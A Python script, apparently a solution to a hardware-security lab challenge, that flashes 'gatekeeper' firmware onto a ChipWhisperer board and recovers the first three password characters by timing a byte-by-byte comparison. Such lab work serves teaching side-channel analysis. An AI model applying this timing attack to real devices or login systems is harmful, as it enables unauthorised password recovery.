import chipwhisperer as cw
import time
import statistics
import matplotlib.pyplot as plt

CHARSET = 'abcdefghijklmnopqrstuvwxyz0123456789{}'
PWD_LEN = 13
SAMPLES = 10
FIRMWARE = '../../../challenges/set1/gatekeeper-CWNANO.hex'

def setup():
    scope = cw.scope()
    target = cw.target(scope, cw.targets.SimpleSerial)
    time.sleep(0.05)
    scope.default_setup()

    import os
    fw_path = os.path.abspath(FIRMWARE)
    prog = cw.programmers.STM32FProgrammer
    cw.program_target(scope, prog, fw_path)
    print("programming done")
    time.sleep(0.2)

    return scope, target

def measure_time(target, password):
    password_bytes = password.encode('ascii')
    start = time.perf_counter()
    target.simpleserial_write('a', password_bytes)
    response = target.simpleserial_read('r', 1)
    end = time.perf_counter()
    return end - start

def analyze_timing_at_position(target, current_password, position):
    timings = {}
    for char in CHARSET:
        pwd_try = (current_password + char).ljust(PWD_LEN, 'a')
        samples = []
        for _ in range(SAMPLES):
            t = measure_time(target, pwd_try)
            samples.append(t)
            time.sleep(0.01)
        median_time = statistics.median(samples)
        timings[char] = median_time

    return timings

def visualize_timing_attack(timings, position):
    chars = list(timings.keys())
    times = list(timings.values())

    plt.figure(figsize=(15, 6))
    plt.bar(chars, times)
    plt.xlabel('character')
    plt.ylabel('median time (s)')
    plt.title(f'timing analysis for position {position}')
    plt.xticks(rotation=0)
    plt.tight_layout()
    plt.savefig(f'timing_position_{position}.png')
    plt.close()

    return max(timings, key=timings.get)

def main():
    scope, target = setup()

    print("\n=== timing side-channel analysis ===\n")
    print("vulnerability: byte-by-byte password comparison")
    print("attack vector: timing differences reveal correct characters\n")

    found_password = ""

    for pos in range(3):
        print(f"\nanalyzing position {pos}...")
        timings = analyze_timing_at_position(target, found_password, pos)
        best_char = visualize_timing_attack(timings, pos)
        found_password += best_char
        print(f"position {pos}: detected timing anomaly for '{best_char}'")
        print(f"current prefix: {found_password}")

    print("\n=== analysis complete ===")
    print(f"timing side-channel confirmed for first {len(found_password)} bytes")
    print(f"detected prefix: {found_password}")

if __name__ == '__main__':
    main()
